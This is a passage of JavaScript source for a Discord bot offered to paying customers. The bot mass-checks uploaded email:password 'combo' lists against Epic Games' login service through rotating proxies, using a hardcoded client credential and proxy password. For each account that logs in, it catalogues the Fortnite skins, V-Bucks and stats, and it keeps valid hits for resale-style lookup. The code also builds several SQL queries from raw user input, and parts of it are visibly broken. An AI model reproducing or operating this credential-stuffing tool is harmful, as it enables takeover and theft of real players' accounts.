              value: `${stats.info.battlePass} | Tier: ${stats.info.battleTire}`,
              inline: true
            },{
              name: `VBucks:`,
              value: `${stats.info.ownedVBucks}`,
              inline: true
            },{
              name: `Solo`,
              value: `Do \`!stats ${args[0]} solo\``,
            },{
              name: `Duo`,
              value: `Do \`!stats ${args[0]} duo\``,
            },{
              name: `Squad`,
              value: `Do \`!stats ${args[0]} squad\``,
      }]}});
  }
  
}

async function itemsCMD(message, args)
{
  if(!args[0]) return message.channel.send("No check ID given!");
  if(args[1])
  {
    //if(args[1] != "skins" || args[1] != "backpacks" || args[1] != "gliders" || args[1] != "pickaxes") return message.channel.send(`\`${args[1]}\` is not a valid item type!`);
    if(args[2]) var page = args[2];
    else var page = 1;
    //console.log(page);
    var pagew = -1 + parseInt(page);

    let conn3, results;
    try {
        conn3 = await pool.getConnection();
        results = await conn3.query(`SELECT * FROM checks WHERE id = '${args[0]}'`);
        await conn3.end();
    } catch (err) { throw err; }
    
    console.log(results);
    if(!results[0]) return message.channel.send("Cannot find check with id: " + args[0]);
    var resultitems = JSON.parse(results[0].items);
    if(!resultitems[args[1]]) return message.channel.send(`\`${args[1]}\` is not a valid item type!`);
    if(!resultitems[args[1]][0]) return await message.channel.send({embed: {
      color: 0xff0000,
      fields: [{
          name: `${args[1].replace(/^(.)|\s(.)/g, ($1) => $1.toUpperCase())} not found`,
          value: `There are no ${args[1]} in this account!`
        }]
    }});
    
    var maxpages = Math.ceil(resultitems[args[1]].length / 21);
    
    if(page > maxpages) return message.reply(`Page **${page}** was not found! Pages available: **${maxpages}**`)

    var i, j, temparray, chunk = 21, pages = [];
    
    for (i=0,j= resultitems[args[1]].length; i<j; i+=chunk) {
        pages.push(resultitems[args[1]].slice(i,i+chunk));
    }

    let embed = new Discord.RichEmbed()
      .setTitle(`${args[1].replace(/^(.)|\s(.)/g, ($1) => $1.toUpperCase())} - Check ID: ${results[0].id}`)
      .setColor("#00ff00")
      .setFooter(`Page: ${page}/${maxpages} | !items ${args[0]} ${args[1]} <page>`); 
    
   /* for (i = 0; i < pages[pagew].length; i++) {
        //services += sql1[i].atype + "\n";?
        //console.log(`${i} | ${pages[pagew][i].atype}`);
        console.log(pages[pagew]);
        servicesembed.addField(`${pages[pagew][i][args[1]]}`, "--------------------");
        if(i == -1 + pages[pagew].length)
        {   
            //console.log(`${i} Ended!`);
            servicesembed.addField(`** **`, `**Page: ${page}/${maxpages} | !items ${args[0]} ${args[1]} <page>**`);
            break;  
        }
        
        }*/
        console.log(resultitems);
        pages[pagew].forEach(item => {
          embed.addField(item, "**--------------------**", true);
        });


    message.author.send(embed);
  }
  else {
    let conn3, results;
    try {
        conn3 = await pool.getConnection();
        results = await conn3.query(`SELECT * FROM checks WHERE id = '${args[0]}'`);
        await conn3.end();
    } catch (err) { throw err; }
  
    if(!results[0]) return message.channel.send("Cannot find check with id: " + args[0]);
    console.log(results[0]);
    var resultitems = JSON.parse(results[0].items);
    
    const embed = new Discord.RichEmbed()
    .setTitle(`Items - Check ID: ${results[0].id}`)
    .setColor("#00ff00")
    .addField(`Pickaxes: ${resultitems.pickaxes.length}`, `Do \`${prefix}items ${results[0].id} pickaxes\``)
    .addField(`Gliders: ${resultitems.gliders.length}`, `Do \`${prefix}items ${results[0].id} gliders\``)
    .addField(`Backpacks: ${resultitems.backpacks.length}`, `Do \`${prefix}items ${results[0].id} backpacks\``)
    .addField(`Dances: ${resultitems.dances.length}`, `Do \`${prefix}items ${results[0].id} dances\``)
    .addField(`Skins: ${resultitems.skins.length}`, `Do \`${prefix}items ${results[0].id} skins\``);
    
    await message.author.send( { embed } );
  }
  
}

async function saveCMD(message, args) // In development...
{
  if(!args[0]) return message.channel.send("No check ID given!");

  let conn3, results;
  try {
      conn3 = await pool.getConnection();
      results = await conn3.query(`SELECT * FROM checks WHERE id = '${args[0]}'`);
      await conn3.end();
  } catch (err) { throw err; }

  if(!results[0]) return message.channel.send("Cannot find check with id: " + args[0]);
  console.log(results[0]);
  var resultitems = JSON.parse(results[0].items);

  
}

// NEW MASS CHECKER

async function comboCheckCMD(message, args) // Command Manager
{
  if(message.guild && message.channel.id != config.checkChannel) return message.reply(`Use ONLY the bot DM!`);

  var server = await client.guilds.find(x => x.id == config.mainServer);
  var members = await server.fetchMembers();
  var member = await members.members.find(m => m.id == message.author.id);

  if(!member.roles.has(config.customerRole)) return;

  var attachment;
  if(message.attachments.first() == null)
  {
      let m = await message.reply("Send me the \`txt\` file! \n\n\Type \`cancel\` to exit or wait 60 seconds!");
      
      var filter = m => m.author.id == message.author.id;
      let respond = await message.channel.awaitMessages(filter, { max: 1, time: 60000, errors: ['time'] }).catch(error => console.error(error.title));

      if(respond.first().content.toLowerCase().startsWith("cancel"))
      {
          return m.delete().catch(console.error);
      }
      else attachment = await respond.first().attachments.first();  
  }
  else attachment = await message.attachments.first();

  var l = attachment.url.length;
  var lastChar = attachment.url.substring(l-3, l); 
  if (lastChar != "txt") { 
      return message.reply("I was expecting \`txt\` file.\nLets do it again...") && addProxies(message, args);
  }
  console.log(attachment.filesize);
  console.log(attachment.filesize > 11000);
  if(attachment.filesize > 11000) return message.reply("You **can only** upload up to **10 KB** ~ 250/300 lines");
  
  var download = await wget.download(attachment.url, `../downloads/masscheck-${message.author.id}.txt`);
  let m = await message.reply("📥**Uploading...**");
  download.on('error', function(err) {
      console.log(err);
  });
  download.on('end', function(output) {
      console.log(output);
  });
  download.on('progress', async function(progress) {
    
      if(progress == 1) return setTimeout(comboCheckCMDByFile, 3000, message, args, m);
  });
}

async function comboCheckCMDByFile(message, args, mge) // Threads Manager
{
  let accounts = [];
  let newmge = await mge.edit({embed: {
    color: 0xffffff,
    footer:
    {
      icon_url: message.author.avatarURL,
      text: `Check by ${message.author.username}`
    },
    author: {
      name: "Mass Check ongoing",
      icon_url: "https://cdn.discordapp.com/emojis/515585176273944587.gif"
    },
    fields: [{
        name: `** **`,
        value: `**Processing your mass request...**`
      }]
  }});

  let conn, count;
  try {
      conn = await pool.getConnection();
      //console.log(items);
      count = await conn.query(`SELECT COUNT(*) FROM mass_checks`);
      await conn.end();
  } catch (err) { throw err; }

  let nextmcID = Object.values(count[0])[0];
  nextmcID++;

  fs.readFile(`../downloads/masscheck-${message.author.id}.txt`, 'utf8', async function (err,data) {
    if (err) {
      return console.log(err);
    }
      const regex = /(.*:\w[\S]*)/gm;
      //const regex = /([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}):([0-9]*)/gm;
      let m;

      while ((m = regex.exec(data)) !== null) {
      // This is necessary to avoid infinite loops with zero-width matches
        if (m.index === regex.lastIndex) {
            regex.lastIndex++;
        }
      
        //console.log(m);
        // The result can be accessed through the `m`-variable.
        accounts.push(m[0]);
      }
      console.log(accounts);

      let hashedaccs = await encrypt(accounts.toString(), message.author.id);

      console.log(hashedaccs);

      let conn2, res, user;
      try {
          conn2 = await pool.getConnection();
          //console.log(items);
          res = await conn2.query(`INSERT INTO ongoingmasschecks (userID, messageID, accounts, accountsCount) VALUES (?, ?, ?, ?)`, [message.author.id, newmge.id, hashedaccs, accounts.length]);
          user = await conn2.query(`SELECT * FROM users WHERE userID = ${message.author.id}`);
          await conn2.end();
      } catch (err) { throw err; }

      console.log(user[0]);
      
      await masschecking.push({
        id: 1 + masschecking.length,
        userID: message.author.id,
        accounntsCount: accounts.length,
        checked: 0,
        validAccounts: [],
        validCount: 0,
        accounts: accounts
      });

      //console.log(masschecking);

      let ttu;
      accounts.length < user[0].threads ? ttu = accounts.length : ttu = user[0].threads;

      for(i = 0; i < ttu; i++)
      {
        massCheckingThread(message, args, nextmcID, res.insertId);
      }
  });

  fs.unlink(`../downloads/masscheck-${message.author.id}.txt`, (err) => { if (err) throw err;} );
}

async function massCheckingThread(message, args, mcID, mcheckID)
{
  console.log(masschecking);

  let results = await masschecking.filter(x => x.userID == message.author.id);

  let a2c = results[0].accounts.shift();
  //console.log(a2c);

  //console.log(mcID);

  var resultformcheck = await comboCheckMethod(message, [a2c], mcID);
  if(!resultformcheck) return;
  console.log("Thread Check results:");
  console.log(resultformcheck);;

  results[0].checked++;

  if(resultformcheck.isError)
  {
    //invalidaccs++;
    console.log(`Is it working -> \nError: ${resultformcheck.error} - ${resultformcheck.errorDescription}`);
    
  }
  else if(!resultformcheck.isError)
  {
    
    results[0].validCount++;
    results[0].validAccounts.push(resultformcheck.checkId);
    console.log(`Is it working ->  ${resultformcheck.checkId} with Proxy ID: ${resultformcheck.proxyId}`);
  }
  else
  {
   console.log("WTF Happend -> ");
   console.log(resultformcheck);
   return;
  }

  if(results[0].accounts.length > 0)
  {
    setTimeout(massCheckingThread, 1500, message, args, mcID, mcheckID);
  }
  else 
  {
    if(results[0].accounntsCount > results[0].checked) return;
    
    let conn2, res;
    try {
      conn2 = await pool.getConnection();
      //console.log(items);
      res = await conn2.query(`SELECT * FROM ongoingmasschecks WHERE id = ${mcheckID}`);
      
      console.log(`Valid Account: ${results[0].validCount} | Invalid Account: ${results[0].accounntsCount - results[0].validCount}`);
      console.log(results[0]);
      
      let dmch = await message.author.createDM();
      let newmge = await dmch.fetchMessage(res[0].messageID);

      //console.log(`${Date.now()} - ${newmge.createdTimestamp}`);
      //console.log(Date.now() - newmge.createdTimestamp);

      if(results[0].validAccounts == 0)
      {
        var requestTime = Date.now() - newmge.createdTimestamp;
        console.log(`This request took: ${pMS(requestTime)}`);
        return newmge.edit({embed: {
          color: 0xff0000,
          footer:
          {
            icon_url: message.author.avatarURL,
            text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
          },
          fields: [{
            name: `Mass Check Failed! `,
            value: `All Accounts are invalid!`
          }]
        }});
      }

      results2 = await conn2.query(`INSERT INTO mass_checks (userid, checkIDs, time) VALUES (?, ?, ?)`, [message.author.id, results[0].validAccounts.toString(), new Date()]);
      await conn2.query(`UPDATE ongoingmasschecks SET accounts = ?, validAccounts = ?, checkedCount = ?, active = ?`, [null, results[0].validAccounts.toString(), results[0].checked, "false"]);

      var server = await client.guilds.find(x => x.id == config.mainServer);
      var members = await server.fetchMembers();

      var requestTime = Date.now() - newmge.createdTimestamp;
      console.log(`This request took: ${pMS(requestTime)}`);
      await newmge.edit({embed: {
          color: 0x00ff00,
          footer:
          {
            icon_url: message.author.avatarURL,
            text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
          },
          fields: [{
            name: `Mass Check Completed - Mass ID: ${results2.insertId}`,
            value: `Valid Account: ${results[0].validCount} | Invalid Account: ${results[0].accounntsCount - results[0].validCount}\n\`Check IDs -> ${results[0].validAccounts.toString()}\``
          }]
      }});

      var channel = members.channels.find(x => x.id == config.checkChannel);
      channel.send({embed: {
        color: 0x00ff00,
        footer:
        {
          icon_url: message.author.avatarURL,
          text: `Check by ${message.author.username} | In ${pMS(requestTime)}`
        },
        fields: [{
          name: `Mass Check Completed - Mass ID: ${results2.insertId}`,
          value: `**IDs: \`${results[0].validAccounts.toString()}\`**`
          },
          {
            name: `!!! Please Ignore this message !!!`,
            value: `** **`
          }]
      }});

      masschecking.splice(-1 + results[0].id, 1);
      console.log(masschecking);
      await conn2.end();
    } catch (err) { throw err; }
  }
}

// Mass Checker

async function comboCheckTestCMD(message, args)
{
  if(message.guild && message.channel.id != config.checkChannel) return message.reply(`Use ONLY the bot DM!`);

  var server = await client.guilds.find(x => x.id == config.mainServer);
  var members = await server.fetchMembers();
  var member = await members.members.find(m => m.id == message.author.id);

  if(!member.roles.has(config.customerRole)) return;

  var attachment;
  if(message.attachments.first() == null)
  {
      let m = await message.reply("Send me the \`txt\` file! \n\n\Type \`cancel\` to exit or wait 60 seconds!");
      
      var filter = m => m.author.id == message.author.id;
      let respond = await message.channel.awaitMessages(filter, { max: 1, time: 60000, errors: ['time'] }).catch(error => console.error(error.title));

      if(respond.first().content.toLowerCase().startsWith("cancel"))
      {
          return m.delete().catch(console.error);
      }
      else attachment = await respond.first().attachments.first();  
  }
  else attachment = await message.attachments.first();

  var l = attachment.url.length;
  var lastChar = attachment.url.substring(l-3, l); 
  if (lastChar != "txt") { 
      return message.reply("I was expecting \`txt\` file.\nLets do it again...") && addProxies(message, args);
  }
  console.log(attachment.filesize);
  console.log(attachment.filesize > 11000);
  if(attachment.filesize > 11000) return message.reply("You **can only** upload up to **10 KB** ~ 250/300 lines");
  
  var download = await wget.download(attachment.url, `../downloads/masscheck-${message.author.id}.txt`);
  let m = await message.reply("📥**Uploading...**");
  download.on('error', function(err) {
      console.log(err);
  });
  download.on('end', function(output) {
      console.log(output);
  });
  download.on('progress', async function(progress) {
    
      if(progress == 1) return setTimeout(comboCheckTestCMDByFile, 3000, message, args, m);
  });
}

async function comboCheckTestCMDByFile(message, args, mge)
{
  let skinnedaccs = 0;
  let invalidaccs = 0;
  let skinnedArray = [];

  let newmge = await mge.edit({embed: {
    color: 0xffffff,
    footer:
    {
      icon_url: message.author.avatarURL,
      text: `Check by ${message.author.username}`
    },
    author: {
      name: "Mass Check ongoing",
      icon_url: "https://cdn.discordapp.com/emojis/515585176273944587.gif"
    },
    fields: [{
        name: `** **`,
        value: `**Processing your mass request...**`
      }]
  }});

  let conn, count;
  try {
      conn = await pool.getConnection();
      //console.log(items);
      count = await conn.query(`SELECT COUNT(*) FROM mass_checks`, [message.author.id, skinnedArray, new Date()]);
      await conn.end();
  } catch (err) { throw err; }
  
  let nextmcID = Object.values(count[0])[0];
  nextmcID++;

  fs.readFile(`../downloads/masscheck-${message.author.id}.txt`, 'utf8', async function (err,data) {
    if (err) {
      return console.log(err);
    }
      const regex = /(.*:\w[\S]*)/gm;
      //const regex = /([0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}):([0-9]*)/gm;
      let m;

      while ((m = regex.exec(data)) !== null) {
      // This is necessary to avoid infinite loops with zero-width matches
      if (m.index === regex.lastIndex) {
          regex.lastIndex++;
      }
      
      //console.log(m);
      // The result can be accessed through the `m`-variable.
      
      var resultformcheck = await comboCheckMethod(message, [m[1]], nextmcID);
      if(resultformcheck.isError)
      {
        invalidaccs++;
        console.log(`Is it working -> \nError: ${resultformcheck.error} - ${resultformcheck.errorDescription}`);
        
      }
      else if(!resultformcheck.isError)
      {
        skinnedaccs++;
        skinnedArray.push(resultformcheck.checkId);
        console.log("Is it working -> " + resultformcheck.checkId);
      }
      else
      {
       console.log("WTF Happend -> ");
       console.log(resultformcheck);
       return;
      } 
    }
    console.log(`Valid Account: ${skinnedaccs} | Invalid Account: ${invalidaccs}`);
    console.log(skinnedArray);

    console.log(`${Date.now()} - ${newmge.createdTimestamp}`);
    console.log(Date.now() - newmge.createdTimestamp);

    //console.log(newmge.edits);
    if(skinnedArray.length == 0)
    {
      var requestTime = Date.now() - newmge.createdTimestamp;
      console.log(`This request took: ${pMS(requestTime)}`);
      return mge.edit({embed: {
          color: 0xff0000,
          footer:
          {
            icon_url: message.author.avatarURL,
            text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
          },
          fields: [{
            name: `Mass Check Failed! `,
            value: `All Accounts are invalid!`
          }]
        }});
      }

    let conn4, results2;
    try {
        conn4 = await pool.getConnection();
        //console.log(items);
        results2 = await conn4.query(`INSERT INTO mass_checks (userid, checkIDs, time) VALUES (?, ?, ?)`, [message.author.id, skinnedArray, new Date()]);
        await conn4.end();
    } catch (err) { throw err; }

    var server = await client.guilds.find(x => x.id == config.mainServer);
    var members = await server.fetchMembers();

    var requestTime = Date.now() - newmge.createdTimestamp;
    console.log(`This request took: ${pMS(requestTime)}`);
    await mge.edit({embed: {
        color: 0x00ff00,
        footer:
        {
          icon_url: message.author.avatarURL,
          text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
        },
        fields: [{
          name: `Mass Check Completed - Mass ID: ${results2.insertId}`,
          value: `Valid Account: ${skinnedaccs} | Invalid Account: ${invalidaccs}\n\`Check IDs -> ${skinnedArray.toString()}\``
        }]
    }});

    var channel = members.channels.find(x => x.id == config.checkChannel);
    channel.send({embed: {
      color: 0x00ff00,
      footer:
      {
        icon_url: message.author.avatarURL,
        text: `Check by ${message.author.username} | In ${pMS(requestTime)}`
      },
      fields: [{
          name: `Mass Check Completed - Mass ID: ${results2.insertId}`,
          value: `**IDs: \`${skinnedArray.toString()}\`**`
          },
          {
            name: `!!! Please Ignore this message !!!`,
            value: `** **`
          }]
          
    }});

  });
  fs.unlink(`../downloads/masscheck-${message.author.id}.txt`, (err) => { if (err) throw err;} );
}

async function comboCheckMethod(message, args, mcID)
{ 
  //console.log("Is a Customer: " + message.member.roles.has("514862196186939392"));
  if(message.guild) await message.delete();
  if(message.guild && message.channel.id != config.checkChannel) return message.reply(`Use ONLY the bot DM!`);

  var finalresults = {};

  var server = await client.guilds.find(x => x.id == config.mainServer);
  var members = await server.fetchMembers();
  var member = await members.members.find(m => m.id == message.author.id);

  if(!member.roles.has(config.customerRole)) return;
  if (!args[0]) return message.channel.send("No account details given!");
  var proxy = await getRandomProxy();
  
  if(proxy.length == 0) finalresults = {
    isError: true,
    error: 'No Proxies',
    errorDescription: 'There are no proxies available!'
  };

  var account = args[0].split(":");
  var items = {
    pickaxes: [],
    backpacks: [],
    skins: [],
    gliders: []
  }

  var stats = {};
  var ownSTW = false;
  var ownedVBucks = 0;

  var agent = new SocksProxyAgent({
    host: proxy[0].ip,
    port: proxy[0].port,
    protocol: 'socks:',
    auth: `${proxy[0].username}:XsKfHlNVIR`
  });

  let xsfrToken = null;
  let j = request.jar()
  
  var encode = await encrypt(`${account[0]}:${account[1]}`, message.author.id);
  let working = await isWProxy(message, proxy);
  console.log(`${working} | ${!working}`);
  if(!working) return comboCheckMethod(message, args);

  var options104 = {
    url: 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',
    method: 'POST',
    headers: {
      'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
      'Authorization': "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=",
      'Keep-Alive': true,
      'Connect-Timeout': 5000,
      'Allow-Auto-Redirect': false,
      'content-type': 'application/x-www-form-urlencoded'
    },
    jar: j,
    body: `grant_type=exchange_code&exchange_code=${m[1]}&token_type=eg1`,
    timeout: 5000,
    agent: agent
  };

  console.log(`${message.author.id} | ${encode} `);
  
  await request(options104).then( async function (body){
    //if(err) return console.error(err);
    var info = JSON.parse(body);
    //console.log(info);
    //console.log(res);
    if(info.access_token)
    { 
        //console.log(info);
        var options100 = {
          url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=campaign&rvn=-1`,
          method: 'POST',
          headers: {
            'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
            'Authorization': `bearer ${info.access_token}`,
            'Keep-Alive': true,
            'Connect-Timeout': 5000,
            'Allow-Auto-Redirect': false,
            'content-type': 'application/json'
          },
          body: "{}",
          agent: agent
        };

        await request(options100).then( async function (body){
          var info100 = JSON.parse(body); 
          //console.log(info100);
          for (var item in info100.profileChanges[0].profile.items) {
            //console.log(item);
            var itemid = info100.profileChanges[0].profile.items[item].templateId.split(":");
            if(itemid[0] == "GiftBox" || itemid[1].startsWith("gb_"))
            {
              ownSTW = true;
              break;
            }
          }
          console.log(info100.profileChanges[0].profile.stats.attributes.level);
          console.log(info100.profileChanges[0].profile.stats.attributes.xp);
          if(!ownSTW && info100.profileChanges[0].profile.stats.attributes.level == 1 && info100.profileChanges[0].profile.stats.attributes.xp == 0) ownSTW = false;
          else ownSTW = true;
        });

        var options101 = {
          url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=common_core&rvn=-1`,
          method: 'POST',
          headers: {
            'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
            'Authorization': `bearer ${info.access_token}`,
            'Keep-Alive': true,
            'Connect-Timeout': 5000,
            'Allow-Auto-Redirect': false,
            'content-type': 'application/json'
          },
          body: "{}",
          agent: agent
        };

        await request(options101).then( async function (body){
          var info101 = JSON.parse(body); 
          //console.log(info101);

          for (var item in info101.profileChanges[0].profile.items) {
            //console.log(item);
            var itemid = info101.profileChanges[0].profile.items[item].templateId.split(":");
            if(itemid[0] == "Currency") ownedVBucks += info101.profileChanges[0].profile.items[item].quantity;
          }
        });

        console.log("Has STW: " + ownSTW);
        console.log("VBucks: " + ownedVBucks);
        
        var options2 = {
          url: `https://account-public-service-prod03.ol.epicgames.com/account/api/public/account?accountId=${info.account_id}`,
          method: 'GET',
          headers: {
            'Authorization': `bearer ${info.access_token}`,
            'Connect-Timeout': 5000,
            'content-type': 'application/json'
          },
          body: "{}",
          agent: agent
        };
        
        await request(options2).then( async function (body){
          //if(err) return console.error(err);
          var info2 = JSON.parse(body); 
          
          var options4 = {
            url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/stats/accountId/${info2[0].id}/bulk/window/alltime`,
            method: 'GET',
            headers: {
              'Authorization': `bearer ${info.access_token}`,
              'Connect-Timeout': 5000,
              'content-type': 'application/json'
            },
            body: "{}",
            agent: agent
          };

          await request(options4).then( async function (body){
            //if(err) return console.error(err);
            var info4 = JSON.parse(body); 
            stats = await extactStats(info4, {id: info2[0].id, username: info2[0].displayName, hasSTW: ownSTW, vbucks: ownedVBucks});
          }).catch( function (err) {
            console.error(err);
            let info = JSON.parse(err.error);
            //console.log(err.message);
            //console.log(typeof(err.message));
            if(info.error_message)
            {
              items.skins.push(itemid[1]);
              message.channel.send({embed: {
                  color: 0xff0000,
                  fields: [{
                      name: `API Error`,
                      value: `Please report this to **ToS#3333**,\n\`${info.query.args}\`\nError uCode: \`#0022\``
                    }]
              }});
            }
            else
            {
              message.channel.send({embed: {
                color: 0xff0000,
                fields: [{
                    name: `API or Check Error`,
                    value: "Something strange happened,\nif this continue please contact ToS#3333\nError uCode: \`#0022\`"
                  }]
            }});
            }
          });;

        }).catch( function (err) {
          console.error(err);
          let info = JSON.parse(err.error);
          //console.log(err.message);
          //console.log(typeof(err.message));
          if(info.error_message)
          {
            items.skins.push(itemid[1]);
            message.channel.send({embed: {
                color: 0xff0000,
                fields: [{
                    name: `API Error`,
                    value: `Please report this to **ToS#3333**,\n\`${info.query.args}\`\nError uCode: \`#0021\``
                  }]
            }});
          }
          else
          {
            message.channel.send({embed: {
              color: 0xff0000,
              fields: [{
                  name: `API or Check Error`,
                  value: "Something strange happened,\nif this continue please contact ToS#3333\nError uCode: \`#0021\`"
                }]
          }});
          }
        });

        var options3 = {
          url: `https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/${info.account_id}/client/QueryProfile?profileId=athena&rvn=-1`,
          method: 'POST',
          headers: {
            'User-Agent': "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit",
            'Authorization': `bearer ${info.access_token}`,
            'Keep-Alive': true,
            'Connect-Timeout': 5000,
            'Allow-Auto-Redirect': false,
            'content-type': 'application/json'
          },
          body: "{}",
          agent: agent
        };

        await request.post(options3).then( async function (body){
          //if(err) return console.error(err);
          var info = JSON.parse(body);  
          //return console.log(info);
          for (var item in info.profileChanges[0].profile.items) {
            // skip loop if the property is from prototype
            var itemid = info.profileChanges[0].profile.items[item].templateId.split(":");
            if(!itemid[1].startsWith("default"))
            {
              switch (itemid[0])
              {
                case "AthenaPickaxe":
                  var options3 = {
                    url: `http://api.tosdev.ga/fncms/api/cosmetics/v1/pickaxe/fullid/${itemid[1]}`
                  }
                  await request(options3).then(async function (body) {
                    /*if(err) console.error(err);
                    else {*/
                      let pickaxedata = JSON.parse(body);
                      //console.log(pickaxedata.name);
                      await items.pickaxes.push(pickaxedata.name);
                      //console.log(items.pickaxes);
                    //}
                  }).catch( function (err) {
                    //console.error(err);
                    let info = JSON.parse(err.error);
                    //console.log(err.message);
                    //console.log(typeof(err.message));
                    if(info.error_message)
                    {
                      items.pickaxes.push(itemid[1]);
                      msitChannel.send({embed: {
                          color: 0xff0000,
                          fields: [{
                              name: `Items API Error`,
                              value: `\`${info.query.args}\``
                            }]
                      }});
                    }
                    else
                    {
                      message.channel.send({embed: {
                        color: 0xff0000,
                        fields: [{
                            name: `API or Check Error`,
                            value: "Something strange happened,\nif this continue please contact ToS#3333"
                          }]
                    }});
                    }
                  });
                  break;
                case "AthenaGlider":
                  var options3 = {
                    url: `http://api.tosdev.ga/fncms/api/cosmetics/v1/glider/fullid/${itemid[1]}`
                  }
                  await request(options3).then(async function (body) {
                    /*if(err) console.error(err);
                    else {*/
                      let gliderdata = JSON.parse(body);
                      //console.log(gliderdata.name);
                      await items.gliders.push(gliderdata.name);
                      //console.log(items.gliders);
                    //}
                  }).catch( function (err) {
                    //console.error(err);
                    let info = JSON.parse(err.error);
                    //console.log(err.message);
                    //console.log(typeof(err.message));
                    if(info.error_message)
                    {
                      items.gliders.push(itemid[1]);
                      msitChannel.send({embed: {
                          color: 0xff0000,
                          fields: [{
                              name: `Items API Error`,
                              value: `\`${info.query.args}\``
                            }]
                      }});
                    }
                    else
                    {
                      message.channel.send({embed: {
                        color: 0xff0000,
                        fields: [{
                            name: `API or Check Error`,
                            value: "Something strange happened,\nif this continue please contact ToS#3333"
                          }]
                    }});
                    }
                  });
                  break;
                case "AthenaBackpack":
                  var options3 = {
                    url: `http://api.tosdev.ga/fncms/api/cosmetics/v1/backpack/fullid/${itemid[1]}`
                  }
                  await request(options3).then(async function (body) {
                    /*if(err) console.error(err);
                    else {*/
                      let backpackdata = JSON.parse(body);
                      //console.log(backpackdata.name);
                      await items.backpacks.push(backpackdata.name);
                      //console.log(items.backpacks);
                    //}
                  }).catch( function (err) {
                    //console.error(err);
                    let info = JSON.parse(err.error);
                    //console.log(err.message);
                    //console.log(typeof(err.message));
                    if(info.error_message)
                    {
                      items.backpacks.push(itemid[1]);
                      msitChannel.send({embed: {
                          color: 0xff0000,
                          fields: [{
                              name: `Items API Error`,
                              value: `\`${info.query.args}\``
                            }]
                      }});
                    }
                    else
                    {
                      message.channel.send({embed: {
                        color: 0xff0000,
                        fields: [{
                            name: `API or Check Error`,
                            value: "Something strange happened,\nif this continue please contact ToS#3333"
                          }]
                    }});
                    }
                    
                  });
                  break;
                case "AthenaCharacter":
                  var options3 = {
                    url: `http://api.tosdev.ga/fncms/api/cosmetics/v1/skin/fullid/${itemid[1]}`
                  }
                  await request(options3).then(async function (body) {
                    /*if(err) //console.error(err);
                    else {*/
                      let skindata = JSON.parse(body);
                      //console.log(skindata.name);
                      await items.skins.push(skindata.name);
                      //console.log(items.skins);
                    //}
                  }).catch( function (err) {
                    //console.error(err);
                    let info = JSON.parse(err.error);
                    //console.log(err.message);
                    //console.log(typeof(err.message));
                    if(info.error_message)
                    {
                      items.skins.push(itemid[1]);
                      //console.log(msitChannel.name);
                      msitChannel.send({embed: {
                          color: 0xff0000,
                          fields: [{
                              name: `Items API Error`,
                              value: `\`${info.query.args}\``
                            }]
                      }});
                    }
                    else
                    {
                      message.channel.send({embed: {
                        color: 0xff0000,
                        fields: [{
                            name: `API or Check Error`,
                            value: "Something strange happened,\nif this continue please contact ToS#3333"
                          }]
                    }});
                    }
                  });
                  break;
              }
            }
          }
        }).catch( function (err) {
          //console.error(err);
          let info = JSON.parse(err.error);
          //console.log(err.message);
          //console.log(typeof(err.message));
          if(info.error_message)
          {
            msitChannel.send({embed: {
                color: 0xffffff,
                fields: [{
                    name: `Items API Error`,
                    value: `\`${info.query.args}\``
                  }]
            }});
          }
          else
          {
            message.channel.send({embed: {
              color: 0xffffff,
              fields: [{
                  name: `API or Check Error`,
                  value: "Something strange happened,\nif this continue please contact ToS#3333"
                }]
          }});
          }
        });
        console.log(items);

        if(items.pickaxes.length == 0 && items.backpacks.length == 0 && items.gliders.length == 0 && items.skins.length == 0)
        {
          //console.log("Here..!"); 
          finalresults = {
            isError: true,
            error: 'Fully Default',
            errorDescription: 'Your account is fully Default'
          };
        }
        else
        {
          let conn3, results;
          try {
            conn3 = await pool.getConnection();
            //console.log(items);
            results = await conn3.query(`INSERT INTO checks (userid, credits, massCheckID,stats, items, time) VALUES (?, ?, ?, ?, ?, ?)`, [message.author.id, encode, mcID, JSON.stringify(stats) ,JSON.stringify(items), new Date()]);
            await conn3.end();
          } catch (err) { throw err; }

          console.log(results);
          
          finalresults = {
            isError: false,
            checkId: results.insertId,
            proxyId: proxy[0].id
          };
        }
        
        console.log(finalresults);

      /*var requestTime = Date.now() - checkingmessage.createdTimestamp;
      console.log(`This request took: ${pMS(requestTime)}`);
      await checkingmessage.delete();

      
      let m = await message.author.send({embed: {
        color: 0x00ff00,
        footer:
        {
          icon_url: message.author.avatarURL,
          text: `Check by ${message.author.username} | In - ${pMS(requestTime)}`
        },
        fields: [{
          name: `Check Completed - Check ID: ${results.insertId}`,
          value: `**Use the reactions to navigate!**`
          }
        ]
      }});
      console.log(m.author.username);
      
      await m.react(`🆚`);
      await m.react(`⛏`);
      await m.react(`☂`);
      await m.react(`👜`);
      await m.react(`🙍`);
        
      let conn4;
      try {
          conn4 = await pool.getConnection();
          //console.log(items);
          await conn4.query(`UPDATE checks SET messageID = ? WHERE id = ?`, [m.id, results.insertId]);
          await conn4.end();
      } catch (err) { throw err; }*/
    }  
  }).catch( async function (err) {
    if(!err.error) return;
    
    try {
      let info = JSON.parse(err.error);
    //console.log(err.message);
    //console.log(typeof(err.message));

    //if(info.errorCode) console.log(info);

    if(info.numericErrorCode == 1041)
    {
      await manageproxies(proxy[0], "true", info.messageVars[0] * 1000);
